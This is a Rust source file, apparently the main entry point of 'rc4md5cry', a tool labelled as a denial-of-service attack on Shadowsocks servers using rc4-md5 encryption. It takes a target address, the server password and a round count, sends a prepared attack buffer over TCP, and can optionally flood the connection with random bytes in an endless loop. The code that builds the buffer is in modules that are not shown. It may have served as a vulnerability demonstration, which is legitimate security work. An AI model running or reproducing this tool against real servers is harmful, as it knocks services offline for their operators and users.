mod rc4;
mod shadowsocks_codec;
mod shadowsocks_packet;
mod vector_config;
mod vector_prepare;

use crate::vector_config::AttackVectorConfig;
use crate::vector_prepare::AttackVector;
use clap::Clap;
use smol::net::SocketAddrV4;
use std::str::FromStr;
use rand::{thread_rng, Rng};

#[derive(Clap)]
#[clap(
    name = "rc4md5cry: denial of service for rc4-md5 shadowsocks nodes",
    version = "0.1",
    author = "Qv2ray Developer Community",
)]
struct Opts {
    /// Address of target server.
    #[clap(short, long)]
    address: String,

    /// Password of rc4-md5 server.
    #[clap(short, long)]
    password: String,

    /// Rounds to prepare and attack.
    #[clap(short, long, default_value = "20000")]
    rounds: usize,

    /// Continue random-shit stress even after finishing.
    #[clap(long)]
    random_stream_after_finished: bool
}

fn main() {
    let opts: Opts = Opts::parse();

    let rounds = opts.rounds;
    let address = SocketAddrV4::from_str(opts.address.as_str()).unwrap();
    let password = opts.password.as_str();

    let vector_config = AttackVectorConfig::new(address, rounds, password);
    let vector: AttackVector = vector_config.into();

    smol::block_on(async move {
        let mut conn = smol::net::TcpStream::connect(address)
            .await
            .expect("failed to connect to target");
        smol::io::copy(vector.buffer.as_slice(), &mut conn)
            .await;
        if opts.random_stream_after_finished {
            let mut buf = [0u8; 65536];
            let mut rng = thread_rng();
            loop {
                rng.fill_bytes(&mut buf);
                smol::io::copy(buf.as_ref(), &mut conn).await;
            }
        }

        Ok::<(), ()>(())
    })
    .unwrap();
}
